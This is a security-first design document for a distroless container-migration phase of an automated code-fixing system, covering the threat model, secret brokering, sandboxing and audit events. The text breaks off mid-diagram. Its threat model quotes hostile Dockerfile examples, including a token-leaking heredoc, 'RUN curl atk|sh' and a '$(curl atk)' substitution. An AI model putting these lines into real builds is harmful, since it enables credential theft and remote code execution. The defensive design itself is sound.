# Phase 07 — Add migration task class (Chainguard distroless): Security-first design

**Lens:** Security — isolation, least privilege, audit, supply chain.
**Designed by:** Security-first design subagent
**Date:** 2026-05-12

---

## Lens summary

Phase 7 is the **supply-chain phase**. Until now the system mutated package manifests inside an existing Node image; Phase 7 mutates *the image itself*. Three things change at once: (a) the recipe rewrites `FROM` lines and multi-stage build topology — a single character in a base-image reference (`cgr.dev/chainguard/node:latest` → `cgr.dev/chamguard/node:latest`) is a portfolio-wide typosquat vector; (b) the system now holds **Chainguard registry credentials**, a registry-push-class secret the system never carried before; (c) the new `ShellInvocationTraceProbe` runs *the candidate image's entrypoint* to count shell invocations — which means a Phase-2-time deterministic gather now executes attacker-influenceable target binaries, an invariant Phase 2 was carefully built to avoid. Phase 7 is also the **extension-by-addition test stand** per [ADR-0028](../../production/adrs/0028-task-class-introduction-order.md): the diff must touch *only* new files. Security has a stake in that test — if "extension by addition" forces edits to the [Phase 5 microVM sandbox](../05-sandbox-trust-gates/design-security.md) or to [Phase 4's prompt-injection fence](../04-vuln-llm-fallback-rag/design-security.md), the contract is wrong and the right fix is to refactor the contract, never to weaken either control.

I optimized — in priority order — for: (1) **the new ShellInvocationTraceProbe runs target binaries inside the Phase-5 microVM, never inside the gather-time subprocess sandbox** — the moment a probe needs to execute attacker-influenceable code, it gets promoted to the [ADR-0012](../../production/adrs/0012-microvm-sandbox-for-trust-gates.md) microVM boundary, full stop, and the Phase-5 RPC contract is the only interface; (2) **Chainguard registry credentials are issued just-in-time, scoped to a single pull, expire in ≤10 minutes, and never enter the microVM environment** — the in-guest egress proxy injects the bearer token on outbound `cgr.dev` requests on behalf of the workload, so the workload sees the proxy but never the token (continuing the Phase-5 pattern); (3) **the CVE-to-image lookup table is treated as an adversarial input source on par with NVD feeds** — pinned by content-addressed digest, BLAKE3-recorded on ingest, signature-verified against Chainguard's published key, and consulted via a pure-function selector with no string interpolation; (4) **the new recipes mutate Dockerfiles through `dockerfile-parse`'s AST, never via regex/string-replace** — a hostile Dockerfile (deeply-nested `ONBUILD`, `RUN <<EOF` heredocs, Windows line endings, BOM markers, mid-line `\r`, malformed `FROM ... AS` aliases) must either parse cleanly or be **rejected pre-recipe** with an audit-chained `dockerfile.parse_rejected` event — partial parses are never accepted; (5) **`dive` is run inside the Phase-5 microVM, not on the orchestrator host** — `dive` is a tarball-walking tool that has been a CVE-bearing dependency twice in the prior five years, and the threat model of running it on the orchestrator host is unacceptable; (6) **every new probe and every new recipe declares an `applies_to_tasks` and `applies_to_languages` set, and a CI test asserts no Phase 0–6 probe registry, gate signal list, or audit-event enum is mutated** — extension-by-addition is enforced by code, not by convention.

I deprioritized: speed of image migration (the recipe is rate-limited at the registry pull layer; a 30-second extra wall-clock on a migration that opens a months-of-cleanup PR is not the bottleneck), Dockerfile-style polish (a hostile-but-parseable Dockerfile that the recipe successfully migrates produces a syntactically-different output than a human would write; that's acceptable — humans review at merge per [ADR-0009](../../production/adrs/0009-humans-always-merge.md)), local Chainguard-registry mirroring on developer laptops (the operator pays a network roundtrip per gate; the alternative is a developer-installable mirror with weaker auth, which I refuse).

The structural choice that defines this lens: **the new task class is a new subgraph and a new probe family wired into the existing Phase-5 microVM and the existing Phase-6 LangGraph by composition, never by mutation**. The Migration Subgraph reads the same `LoopState` schema, emits the same `ObjectiveSignals` payload (extended by *new* fields the strict-AND scorer was designed to accept additively), and writes audit events into the same BLAKE3 chain. If the [Phase-6 state-ledger ACL](../06-sherpa-state-machine/design-security.md) needs new field names (`base_image_pre`, `base_image_post`, `image_digest_pre`, `image_digest_post`, `shell_invocation_delta`), they land via additive Pydantic model extension under `migration/state.py` — never by editing `loop/state.py`. The signal scorer accepts new strict-AND inputs via a registered-extension hook the Phase-5 code already exposes (see `TrustGate.register_signal`).

**Contradiction-to-prior-design surfaced.** Phase 2's design-security forbids "executing the repo's own code at gather time." Phase 7's `ShellInvocationTraceProbe` looks, at first glance, like it executes the target's entrypoint at gather time. I resolve this by **classifying `ShellInvocationTraceProbe` as a gate-time probe, not a gather-time probe** — it is invoked from inside a Phase-5 microVM during the Migration Subgraph's validation gate (with a *candidate* image, post-recipe), not by the Phase-2 coordinator. The probe satisfies the Phase-2 `Probe` ABC contract (so it can be invoked by name + cached + audited), but its `applies_to_lifecycle` field is `["gate"]`, not `["gather"]`. The coordinator refuses to schedule a `gate`-lifecycle probe at gather time. This is a new field on the probe contract — additive, per the Phase 2 §4 contract surface. The synth must confirm this is the right resolution.

---

## Threat model

### Assets to protect

1. **Chainguard registry credentials.** A new class of secret the system did not previously hold. Even a *read-only* pull token has supply-chain implications: a token that survives in audit logs or env vars and is later leaked allows an attacker to enumerate every image the org pulls (a reconnaissance pivot for picking the next supply-chain attack vector). A *write-class* token (if Phase 7 ever holds one — I argue it should not) would let an attacker push a malicious image that the org's pull-through trusts.
2. **The CVE-to-image-recommendation lookup table.** New adversarial input. A poisoned record that maps `CVE-2024-XXXXX in node:20` → `cgr.dev/chainguard/atk-typo:20` redirects every migration of every Node service. Single-record portfolio compromise.
3. **The base-image digest pinning manifest.** `tools/digests.yaml` extends with Chainguard image digests. A silent edit (or a future automated bump that races the CVE-blocklist) is a portfolio-grade compromise: every gate in every workflow pulls the wrong image.
4. **Target-repo Dockerfiles.** Now read+write, not read-only. Phase 7 *patches* Dockerfiles. A bug in the recipe (e.g., dropping a `USER` directive, replacing `COPY --chown=user:user` with `COPY`) is a security regression that ships in the PR. The gate must catch it; if the gate doesn't catch it, [Phase 11](../../roadmap.md)'s human review must.
5. **Container build cache.** `docker buildx` populates a build cache. A poisoned cache layer from one workflow that bleeds into another (cross-workflow contamination) is a portfolio pivot. The Phase-5 per-workflow scoping continues; Phase 7 adds buildx-specific scoping (`BUILDX_CACHE_FROM` set to per-workflow ephemeral).
6. **The Phase-5 microVM rootfs digest.** Phase 7 *extends* the rootfs because the gate now runs `docker buildx`, `dive`, `dockerfile-parse`, and the `ShellInvocationTraceProbe`'s in-microVM image runner. Each new tool is a new supply-chain inlet into the rootfs. The rootfs digest in `tools/digests.yaml` must be re-pinned and re-reviewed.
7. **Carried forward from prior phases:** the audit chain, the orchestrator address space, the [Phase-6 checkpointer DB](../06-sherpa-state-machine/design-security.md), the gate-control HMAC key, the operator HITL key, the [Phase-5 microVM control-plane creds](../05-sandbox-trust-gates/design-security.md), the [Phase-4 LLM API key](../04-vuln-llm-fallback-rag/design-security.md), the [Phase-3 git working tree](../03-vuln-deterministic-recipe/design-security.md).

### Adversaries assumed

- **Poisoned-image-recommendation adversary.** Compromises the CVE-to-image lookup table at ingest time (or compromises the Chainguard advisory mirror it derives from). Goal: make the recipe pick `cgr.dev/chainguard/<atk>:<ver>` for some popular CVE. Mitigations: lookup table is content-addressed and signature-verified against Chainguard's published key at ingest; recipe consults the table by an exact-match key, never substring or regex; the resulting image reference is validated against an allowlist of `^cgr\.dev/chainguard/[a-z0-9-]+(@sha256:[a-f0-9]{64}|:[a-z0-9._-]+)$` before any pull is attempted; a Levenshtein-distance check against the *prior* image name flags suspicious renames (e.g., `chainguard/node` → `chainguard/n0de`) for human review.

- **Dockerfile-injection adversary.** Hostile Dockerfile in the target repo: `RUN <<EOF ...\necho "$CHAINGUARD_TOKEN" > /var/log/leak\nEOF`, `ONBUILD ARG ATTACKER_PAYLOAD`, mid-line `\r` that hides a `RUN curl atk|sh`, Windows-1252 encoded `FROM` line, BOM-prefixed first line, deeply-nested `--platform=$(curl atk)` substitutions. Goal: get the recipe to either fail-open (apply the patch incorrectly) or to silently execute a command at build time inside the gate. Mitigations: `dockerfile-parse`'s strict-mode AST only; UTF-8 decoding rejects on `errors='strict'`; BOM rejected; `\r` rejected (Dockerfiles are LF); `ARG`/`ENV` interpolations refused if the variable isn't a literal known to the recipe; `ONBUILD` rejected outright in Phase 7 (an `ONBUILD` Dockerfile is escalated for human review); a corpus of ~30 known-adversarial Dockerfiles from the Snyk / Synopsys research corpus is in CI as `tests/adversarial/dockerfiles/`.

- **Image-name typosquat adversary.** Pre-stages `cgr.dev/chamguard/node:20` (note the swap) and waits for the recipe to typo. Mitigations: the image-name allowlist regex enforces `chainguard` literally; the recipe's `BaseImageProbe` output is compared character-by-character to the lookup table value before patch; on disagreement the recipe escalates; the resulting Dockerfile *after* patching is parsed and the `FROM` reference is re-validated through the same allowlist before commit.

- **Build-time-execution adversary.** Patched Dockerfile, when built, runs arbitrary code in the build stage. Even with a correct `FROM` line, `RUN` instructions execute. Mitigations: `docker buildx` runs inside the [Phase-5 microVM](../05-sandbox-trust-gates/design-security.md), default-deny egress, allowlist extended from Phase 5's `{registry.npmjs.org, cgr.dev, docker.io, gate-callback}` to add the same set scoped for `buildx`'s registry-pull-through; the build's `RUN` commands are visible in the runtime trace (eBPF on the host side); a `build.trace.new_egress_endpoint > 0` strict-AND signal fails the gate; build wall-clock cap 10 min; buildx cache scoped per-workflow.

- **Image-runtime exfil adversary.** The `ShellInvocationTraceProbe` runs the *patched* image's `ENTRYPOINT`/`CMD` to count shell invocations. The patched binary phones home with secrets it found in the image. Mitigations: the probe runs inside a fresh Phase-5 microVM with default-deny egress; the image is run with `--read-only --network=none --tmpfs /tmp --user nobody:nobody --cap-drop=ALL`; the trace is the only output read (the image's stdout/stderr are captured but treated as opaque bytes with a 1 MB cap); the probe's wall-clock is capped at 30 seconds (an image whose entrypoint doesn't print "ready" or exit in 30s is reported as `runtime_trace.entrypoint_timeout=true`).

- **Distroless-regression adversary.** The recipe successfully migrates `node:20` → `cgr.dev/chainguard/node:20-distroless` but the migrated image **still has shell or package-manager surface area** because the recipe missed a multi-stage `COPY --from=builder /bin/sh /bin/sh`, or because a `RUN` later in the file re-injects `apk add`. Mitigations: the `ShellInvocationTraceProbe`'s `shell_invocation_count` is computed from *both* the runtime trace and from a `dive`-derived static analysis of the image layers (a static `/bin/sh` in the final layer fails the gate even if it's never invoked at runtime); the strict-AND demands both `shell_invocation_count == 0` (runtime) AND `static_shell_binary_count == 0` (image layers).

- **Chainguard-registry MITM adversary.** Network-on-path between gate and `cgr.dev`. Mitigations: pinned digest pulls (`@sha256:...`) wherever the recipe supports it; TLS pinning at the Phase-5 egress proxy on `cgr.dev`'s CA chain; the image's signature is verified via `cosign verify --certificate-identity-regexp ... --certificate-oidc-issuer https://token.actions.githubusercontent.com` inside the microVM before the migrated image is "accepted" — a signature check failure fails the gate as `image.signature_invalid`.

- **Chainguard-credential-exfil adversary.** Patch is crafted to extract the registry token from the build environment. Mitigations: the token is not in the build env — it lives in the Phase-5 in-VM egress proxy and is injected on outbound `cgr.dev` requests on the workload's behalf; `docker buildx` is configured with `--builder=ephemeral`, no host-mounted docker config, and no `~/.docker/config.json`; the in-VM proxy logs every `cgr.dev` request size + sha-of-path; `proxy.cgr_egress_bytes > 200 MB` is an audit-flagged anomaly.

- **`dive`-CVE adversary.** `dive` (the image-inspection tool) is a JSON-parsing tool with a history of CVEs in the prior five years. A malicious image layer crafted to exploit a `dive` parsing bug pivots from "scan a tarball" to "execute attacker code on the host running dive." Mitigations: `dive` runs *inside* the microVM, never on the orchestrator host; its output is parsed by a strict Pydantic model (`extra='forbid'`) before reaching gate-control; the `dive` binary digest is pinned in `tools/digests.yaml#sandbox.dive` and rotated on every upstream release.

- **`dockerfile-parse` adversary.** Hostile Dockerfile crafted to crash, hang, or RCE the parser. Mitigations: `dockerfile-parse` runs in a *subprocess* of the gate-control daemon (or, equivalently, inside the microVM — the orchestrator never invokes it in-process for adversarial Dockerfiles); a 10-second per-parse wall-clock; a 1 MB input cap (Dockerfiles larger than 1 MB are *automatically* escalated for human review — no legitimate Dockerfile is that large); the parser's own digest pinned and rotated on every upstream release.

- **Extension-by-addition violation as an attack vector.** A future contributor proposes a "small fix" to Phase 5's `ObjectiveSignals` to add a `migration_specific_field`, and a security-review-fatigued reviewer rubber-stamps it. The "addition" silently violates ADR-0028 and changes the contract surface that Phases 0–6 depend on. Mitigations: a CI test asserts the byte-stable digest of Phase 0–6 source files matches `tools/phase-frozen-digests.yaml`; any change to a frozen file fails CI with a clear message pointing at ADR-0028; the only way to merge a frozen-file change is an explicit ADR amendment in the same PR.

- **Operator-misuse adversary.** Operator passes `--allow-unsigned-images`, `--skip-cosign-verify`, `--auto-bump-chainguard-digests`, or `--unsafe-shell-presence-ok`. Mitigations: every flag is explicit, audit-chained to a `gate.unsafe_mode` event with the specific flag name, and propagates downstream as untrusted (the [Phase 11 PR-opening logic, when it lands](../../roadmap.md), refuses to auto-open PRs whose gates were run under any unsafe-mode flag).

- **Carried forward from prior phases:** prompt-injection in Dockerfile RUN comments (Phase 4 fence-wrapping continues to apply when the recipe falls back to LLM); sandbox escape from inside the microVM (Phase 5 microVM boundary is unchanged); checkpoint tampering (Phase 6 BLAKE3-anchored ledger is unchanged).

### Attack surfaces specific to this phase

1. **Dockerfile parse → patch → re-parse loop.** The recipe parses, mutates the AST, serializes, and verifies the serialization re-parses to an equivalent AST. Surface: parse asymmetry — a Dockerfile that the parser accepts but emits non-equivalently on round-trip is a place for adversarial drift. Mitigation: parse(serialize(parse(input))) == parse(input) is a property test on a 30-Dockerfile adversarial corpus.

2. **CVE-to-image lookup ingest.** A new feed-class ingest. Surface: signature spoofing, snapshot replay (use an older snapshot that maps the CVE to a now-deprecated image), record poisoning. Mitigation: snapshot is content-addressed; ingest is a one-shot, audited, signed-manifest ceremony exactly like the Phase-3 CVE feed ingest; the snapshot file's BLAKE3 is recorded in the audit chain on every gate that consumes it.

3. **`cgr.dev` egress.** New trusted domain. Surface: the allowlist now grants `cgr.dev`; an adversary inside the microVM uses `cgr.dev` as a high-trust covert channel destination (the host won't block it). Mitigations: per-request size and path logging at the in-VM egress proxy; the proxy injects the auth token only on requests whose path matches `^/v2/chainguard/(known-image)/blobs/sha256:[a-f0-9]{64}$` or the standard OCI distribution paths; arbitrary `cgr.dev` paths get no token (the workload can still try, but Chainguard returns 401, and the audit chain logs `cgr.egress.unrecognized_path`).

4. **`docker buildx` itself.** Buildx has builder containers, frontends, and a complex multi-stage execution model. The buildx daemon is a privileged process. Surface: buildx running on the host kernel is a shared-kernel-container attack surface. Mitigation: buildx runs *inside* the Phase-5 microVM (the rootfs ships buildx); the host never spawns a buildx process; the in-microVM buildx uses `--builder=ephemeral` per-gate, no shared builder.

5. **The new probes' Phase-2 contract extension.** `BaseImageProbe` and `ShellInvocationTraceProbe` are *new* probes. The Phase-2 probe-contract surface is the seam (`@register_probe`, `declared_inputs`, `applies_to_tasks`, `applies_to_languages`, and the new `applies_to_lifecycle`). Surface: a poorly-shaped new probe accidentally exposes a new field on the `Probe` ABC, forcing a Phase-2 edit. Mitigation: the new probes are tested against the *existing* Phase-2 `Probe` ABC unmodified; the `applies_to_lifecycle` field is a `ClassVar` default that pre-existing probes inherit-as-gather without code change.

6. **`ShellInvocationTraceProbe`'s "run the target binary" semantic.** The probe runs *the candidate image's ENTRYPOINT*. Surface: a malicious entrypoint runs at gate time. Mitigation: the probe wraps the run in a [Phase-5 microVM](../05-sandbox-trust-gates/design-security.md) — same boundary as the rest of Phase 5, no shared kernel, no orchestrator credentials inside, default-deny egress, read-only filesystem, `--cap-drop=ALL`, `--user nobody:nobody`. The probe is documented as a "privileged observer" — it observes from the host side via eBPF on the microVM, *not* from inside the image. The image itself runs as the lowest-privilege user.

7. **The migration Subgraph composing with the vuln Subgraph.** Phase 7's Migration Subgraph and the vuln Subgraph share the same orchestrator process. Surface: state leakage between subgraphs (a `LoopState` field one writes that the other reads unexpectedly). Mitigation: the [Phase-6 field ACLs](../06-sherpa-state-machine/design-security.md) extend with explicit `write_acl={"plan_distroless", "apply_dockerfile_patch", "validate_distroless_gate"}` on every new field; a CI test asserts no Phase 0–6 reducer touches any new field.

8. **Image-signature verification path.** New code path: `cosign verify` inside the microVM. Surface: cosign CVE, OIDC root-of-trust mis-configuration, signature-rebroadcast attacks. Mitigations: cosign binary digest pinned; the OIDC issuer regex pinned in `tools/cosign-policy.yaml`; signature verification is deterministic — same inputs, same verdict, cacheable; the verification result is part of the audit chain (`image.signature.verified` with the certificate identity and the issuer).

### Trust boundaries

```
   ┌──────────────────────────────────────────────────────────────────────┐
   │  HOST OPERATOR  (TRUSTED) — unchanged from Phase 5/6                  │
   │  - operator.key, SSH, GPG; never enters orchestrator process          │
   └────────────────────────┬─────────────────────────────────────────────┘
                            │  `codegenie migrate <repo> --task distroless`
                            ▼
   ┌──────────────────────────────────────────────────────────────────────┐
   │  ORCHESTRATOR  (SEMI-TRUSTED) — Phase 6 LangGraph + Phase 5 RPC      │
   │  - holds Anthropic key (Phase 4), gate-control HMAC key, audit       │
   │    signing key, [Phase-6 LoopState]                                  │
   │  - holds the new CHAINGUARD_REGISTRY_TOKEN_REF (a credential handle  │
   │    that resolves through a per-host secret broker; the token itself  │
   │    is fetched JIT and never lives in the orchestrator address space) │
   │  - DOES NOT execute LLM-produced patches; DOES NOT exec docker       │
   │  - reads new probes' outputs through unchanged Phase-2 Probe ABC     │
   └────────────────┬─────────────────────────────────────────────────────┘
                    │   AF_UNIX HMAC envelope (Phase 5 RPC)
                    ▼
   ┌──────────────────────────────────────────────────────────────────────┐
   │  GATE-CONTROL DAEMON  (SEMI-TRUSTED) — Phase 5 daemon                 │
   │  - extended to mint Chainguard pull-through tokens:                  │
   │       1. asks the per-host SECRET BROKER for a short-TTL token       │
   │       2. injects it into the microVM at boot ONLY in the egress      │
   │          proxy's keyring (NEVER in the workload env)                 │
   │       3. revokes (best-effort) on microVM destroy                    │
   │  - extended audit events: `chainguard.token.minted`,                 │
   │       `chainguard.token.revoked`, `image.signature.verified`,        │
   │       `image.signature.invalid`, `dockerfile.parse_rejected`         │
   └────────────────┬─────────────────────────────────────────────────────┘
                    │  microVM spawn with extended rootfs:
                    │   + docker-buildx@<pinned>                          
                    │   + dive@<pinned>                                   
                    │   + dockerfile-parse@<pinned>                       
                    │   + cosign@<pinned>                                 
                    │   + chainguard-image-runner (entrypoint exec util)  
   TRUST BOUNDARY: hardware-virtualized (Firecracker) OR syscall-mediated (gVisor) — UNCHANGED
                    ▼
   ┌──────────────────────────────────────────────────────────────────────┐
   │  MICROVM (UNTRUSTED) — Phase 5 microVM, extended rootfs               │
   │  Migration-gate workload:                                             │
   │    1. dockerfile-parse Dockerfile_pre  → AST                          │
   │    2. apply recipe AST mutations         → AST'                       │
   │    3. serialize AST' → Dockerfile_post                                │
   │    4. dockerfile-parse Dockerfile_post → AST''                        │
   │       assert AST' ≡ AST''  (round-trip safety)                        │
   │    5. docker buildx build --no-cache Dockerfile_post → image_post     │
   │    6. cosign verify cgr.dev/chainguard/<base>@<digest>                │
   │    7. dive --json image_post → static_shell_binary_count              │
   │    8. ChainguardImageRunner exec image_post --read-only --cap-drop=ALL│
   │       trace observed FROM HOST eBPF (Phase 5 trace collector)         │
   │    9. emit ObjectiveSignals_distroless                                │
   │                                                                       │
   │  egress allowlist (extended additively from Phase 5):                 │
   │    registry.npmjs.org, cgr.dev, docker.io, gate-callback              │
   │  egress proxy injects CHAINGUARD_TOKEN ONLY on allowlisted cgr.dev    │
   │    paths matching the OCI distribution spec; never on others          │
   │  egress caps: 500 MB per gate (raised from Phase 5's 200 MB           │
   │    because base-image pulls are ~200 MB); 30 req/s (unchanged)        │
   │                                                                       │
   │  NO host docker socket. NO host docker config. NO host buildx.        │
   │  NO Chainguard token in workload env.                                 │
   │  Lifetime: ≤10 min wall-clock (raised from Phase 5's 5 min);          │
   │    then SIGKILL + destroy.                                            │
   └────────────────┬─────────────────────────────────────────────────────┘
                    │  POST gate-callback with extended ObjectiveSignals
                    ▼
   ┌──────────────────────────────────────────────────────────────────────┐
   │  GATE-CONTROL validates, signs, audits, returns verdict to            │
   │  ORCHESTRATOR via Phase 5 RPC. Chainguard token revoked.              │
   └──────────────────────────────────────────────────────────────────────┘
                    │
                    ▼
   ┌──────────────────────────────────────────────────────────────────────┐
   │  SECRET BROKER (per-host, separate process)                           │
   │  - codegenie-secretd, runs as its own Unix user                       │
   │  - holds Chainguard refresh credential (long-lived, on disk 0600,     │
   │    encrypted at rest via OS keychain or age-encrypted file)           │
   │  - mints short-TTL (≤10 min) read-only pull-through tokens on demand  │
   │  - rate-limited (≤6 mints/min/workflow, ≤60 mints/hr/host)            │
   │  - emits chain-anchored audit on every mint + revoke                  │
   │  - NEVER hands out the refresh credential                             │
   │  - NEVER answers a mint request that lacks a valid gate-control HMAC  │
   └──────────────────────────────────────────────────────────────────────┘
```

The boundary marked **TRUST BOUNDARY** is the same Phase-5 microVM boundary. **No Phase-7 control crosses it; Phase 7 only adds workload inside the boundary.** That structural property is the whole point of [ADR-0028](../../production/adrs/0028-task-class-introduction-order.md)'s extension-by-addition: if a new task class can be implemented entirely on the safe side of the existing trust boundaries, the contract is right.

The new external boundary is the **SECRET BROKER** — the only process that ever holds the long-lived Chainguard credential. Splitting it out preserves the [Phase-5 rule](../05-sandbox-trust-gates/design-security.md) that "the orchestrator does not hold push-class credentials"; the broker is the answer to "where do pull-class credentials live now."

---

## Goals (concrete, measurable)

1. **Sandbox escape risk** — unchanged from [Phase 5](../05-sandbox-trust-gates/design-security.md). Phase 7 adds workload inside the microVM (buildx, dive, dockerfile-parse, cosign, image-runner); the microVM boundary is unchanged. The rootfs digest is rotated to incorporate the new tools and re-reviewed.

2. **Credential blast radius if a worker is compromised** — zero Chainguard credentials inside the microVM workload. The Chainguard pull token is held by the in-VM egress proxy, injected only on allowlisted `cgr.dev` OCI-distribution paths, and revoked on microVM destroy. TTL ≤10 min; per-workflow mint cap 6/min; per-host mint cap 60/hr. The long-lived Chainguard refresh credential lives only in the Secret Broker process and is never read by gate-control or by the microVM.

3. **Audit completeness target** — every new gate decision produces:
   - `dockerfile.parse_started` — workflow_id, gate_id, dockerfile_digest_pre
   - `dockerfile.parse_rejected` — workflow_id, gate_id, dockerfile_digest_pre, reason_code (BOM | CR | non-UTF8 | malformed | onbuild_present | size_cap_exceeded | timeout)
   - `dockerfile.recipe_applied` — workflow_id, gate_id, recipe_id, dockerfile_digest_pre, dockerfile_digest_post, ast_equivalence_round_trip_ok
   - `chainguard.token.minted` — workflow_id, gate_id, scope (image_ref), ttl_s, broker_request_digest
   - `chainguard.token.revoked` — workflow_id, gate_id, mint_id, reason (gate_complete | gate_timeout | gate_error)
   - `image.signature.verified` — workflow_id, gate_id, image_ref, image_digest, cert_identity, cert_oidc_issuer
   - `image.signature.invalid` — workflow_id, gate_id, image_ref, image_digest, reason
   - `cgr.egress.unrecognized_path` — workflow_id, gate_id, path_hash, byte_size_attempted
   - `migration.shell_invocation_trace_completed` — workflow_id, gate_id, runtime_shell_count, static_shell_count, runtime_egress_endpoint_count
   Every entry chains to the prior; chain verification on gate-control startup is unchanged.

4. **Allowed network egress** — extends Phase 5 additively: `{registry.npmjs.org, cgr.dev, docker.io, gate-callback}`. No new domains. `cgr.dev` per-request path validated against the OCI distribution path regex before the token is injected. Per-gate egress cap raised to **500 MB** (base-image pulls); per-gate request-rate cap unchanged at 30 req/s. Per-gate per-domain byte caps logged: `cgr.dev` ≤450 MB; `docker.io` ≤450 MB; `registry.npmjs.org` ≤200 MB; gate-callback ≤64 KB.

5. **Extension-by-addition enforcement** — a CI test computes BLAKE3 over every source file under `src/codegenie/{loop,sandbox,gate,fallback,probes/{layerA,layerB,layerC,layerD,layerE,layerF,layerG},audit,state}/` and compares against `tools/phase-frozen-digests.yaml`. Any drift fails CI with a message naming ADR-0028 and the file that changed. The only way to land a frozen-file edit is to amend ADR-0028 in the same PR (a CI label gate enforces this).

6. **Dockerfile parse safety target** — 100% of the adversarial-Dockerfile test corpus (≥30 fixtures) either parses cleanly to an AST or is rejected pre-recipe with an audit-chained `dockerfile.parse_rejected` event. Zero fixtures may produce a "partial parse that gets a recipe applied to it." A property test asserts `parse(serialize(parse(x))) == parse(x)` on the same corpus.

7. **CVE-to-image lookup table integrity** — the table is shipped as `tools/cve-image-map.yaml.sig` plus `tools/cve-image-map.yaml`; ingest verifies the signature against `tools/chainguard-publisher.pub` (committed at install time via the same signed-manifest ceremony the Phase-3 NVD feed uses); the table's BLAKE3 is recorded on every `dockerfile.recipe_applied` audit event so a post-hoc investigator can replay the exact mapping that drove every migration.

8. **Image-signature verification SLA** — every migrated image's base reference is verified via `cosign verify` against the pinned OIDC issuer and certificate-identity policy in `tools/cosign-policy.yaml`. A signature-verify failure fails the gate as `image.signature.invalid`. No `--skip-cosign-verify` flag exists.

9. **Three-retry cap, unchanged** — per [ADR-0014](../../production/adrs/0014-three-retry-default-per-gate.md), the retry cap is 3. Phase 7's retries are: retry-1 = same recipe with `--allow-multi-stage-restructure=true`; retry-2 = recipe falls back to LLM fence-wrapped patch generation (Phase 4 path, unchanged); retry-3 = escalate to human review. No `--allow-extra-retries` flag in Phase 7.

10. **Trust score, additively extended** — the Phase-5 binary strict-AND scorer accepts new signals via `TrustGate.register_signal(name, schema_field, predicate)`. Phase 7 registers: `shell_invocation_count == 0`, `static_shell_binary_count == 0`, `image.signature.verified == true`, `dockerfile.ast_round_trip_ok == true`, `chainguard.egress.unrecognized_path_count == 0`, `image_size_post / image_size_pre ≤ 0.8` (a soft signal — distroless images are typically <80% the size of the parent; a "migrated" image that *grew* is suspicious). The strict-AND remains binary (per [ADR-0008](../../production/adrs/0008-objective-signal-trust-score.md)'s pre-calibration default); the new signals are additional `false` ↦ `verdict=fail` inputs.

11. **No LLM in the recipe path** — the deterministic recipe path uses `dockerfile-parse` AST manipulation only. The LLM is invoked only on retry-2 (Phase 4 fallback path, unchanged) and only with the fence-wrapped pre-patch Dockerfile + the gate's last error log; the LLM's output is parsed back through `dockerfile-parse` strict mode and the round-trip safety check applies identically.

12. **No new ambient credentials in the orchestrator address space** — the orchestrator holds a *handle* to the Chainguard credential (`CHAINGUARD_REGISTRY_TOKEN_REF`, a per-host opaque reference), not the credential itself. The handle is resolved by the Secret Broker JIT at mint time. An orchestrator memory dump never contains the Chainguard refresh credential.

13. **Frozen Phase 0–6 source files** — the diff for Phase 7 touches *only* new files under `src/codegenie/migration/`, `src/codegenie/probes/migration/`, new ADRs under `docs/phases/07-migration-task-class/ADRs/`, new test fixtures, and `tools/digests.yaml` (additive entries only — a CI test asserts no existing line in `tools/digests.yaml` is modified, only appended). The "additive-only" check on `tools/digests.yaml` is a separate CI gate.

---

## Architecture

```
codegenie migrate <repo> --task distroless                      ▲ Operator surface
                       │                                         │ (unchanged from Phase 6 except new flag)
                       ▼                                         │
┌─────────────────────────────────────────────────────────────────────────┐
│ ORCHESTRATOR — Phase 6 LangGraph runtime, unmodified                     │
│   Supervisor (Phase 6, unchanged): routes by `state.task_class`         │
│      "vuln"      → VulnSubgraph (Phase 3 + 4 + 5 + 6, unchanged)         │
│      "distroless"→ MigrationSubgraph (NEW, Phase 7)                      │
│                                                                          │
│   Both subgraphs share:                                                  │
│      - the same Phase-5 TrustGate RPC client                             │
│      - the same Phase-6 SqliteSaver checkpointer                         │
│      - the same Phase-2 BLAKE3 audit chain                               │
│      - the same Phase-4 LLM fallback (called only on retry-2)            │
│                                                                          │
│   MigrationSubgraph nodes (all NEW files under src/codegenie/migration/):│
│     gather_image_context   reads RepoContext slices: dockerfile_*,       │
│                              base_image_*, shell_usage, certificate,     │
│                              entrypoint. Pure read; no side effects.     │
│     plan_distroless_recipe pure function over (RepoContext, cve_image_  │
│                              map_digest); selects recipe + target image. │
│                              SIDE-EFFECT-FREE (planning only).           │
│     apply_dockerfile_patch  dockerfile-parse AST mutation; writes        │
│                              .codegenie/patches/<wf>/Dockerfile.diff;    │
│                              SIDE-EFFECT (file write). Phase 6 side-     │
│                              effect-guard protocol applies unchanged.    │
│     validate_distroless_gate Phase 5 TrustGate.evaluate(GateRequest);    │
│                              GateRequest is the Phase-5 schema PLUS new  │
│                              optional fields (added via Pydantic         │
│                              model extension under migration/state.py,   │
│                              never by editing Phase 5's `state.py`).     │
│     record_verdict          Phase 6 reducer pattern; new reducer        │
│                              `record_distroless_verdict` writes only     │
│                              new fields per Phase-6 field ACLs.          │
│     await_human_review      Phase 6 interrupt node, unchanged.           │
│     finalize_pass / finalize_escalate (terminal, Phase 6 unchanged)      │
└────────────────────┬────────────────────────────────────────────────────┘
                     │ Phase 5 AF_UNIX RPC (unchanged envelope; signal set extended)
                     ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ GATE-CONTROL DAEMON — Phase 5 daemon, with NEW additive components:      │
│                                                                          │
│   ChainguardTokenMinter (NEW, src/codegenie/gate/chainguard_minter.py)  │
│      - calls codegenie-secretd over AF_UNIX                              │
│      - records every mint + revoke in audit chain                        │
│      - never persists tokens to disk                                     │
│      - per-workflow + per-host rate limits                                │
│                                                                          │
│   MigrationSignalScorer (NEW, src/codegenie/gate/migration_signals.py)  │
│      - registers via TrustGate.register_signal(...) at startup           │
│      - extends the Phase-5 strict-AND scorer additively                  │
│      - does NOT modify the Phase-5 scorer code                           │
└────────────────────┬────────────────────────────────────────────────────┘
                     │ Phase 5 microVM spawn (rootfs digest rotated to include
                     │  buildx, dive, dockerfile-parse, cosign, image-runner)
                     ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ MIGRATION GATE MICROVM (Phase 5 microVM, additive rootfs)                │
│                                                                          │
│  copy-in:                                                                │
│    /work/repo                  (snapshot of working tree post-patch)     │
│    /work/Dockerfile.patch       (the patch under test)                   │
│    /work/cve-image-map.snapshot (BLAKE3-recorded, signature-verified)    │
│    /work/cosign-policy.yaml     (pinned issuer + identity regex)         │
│                                                                          │
│  workload (additive over Phase 5):                                       │
│    1. dockerfile-parse Dockerfile_pre   strict; size cap 1 MB; 10s cap   │
│    2. apply recipe AST mutation                                          │
│    3. round-trip: parse(serialize(AST')) == parse(input)                 │
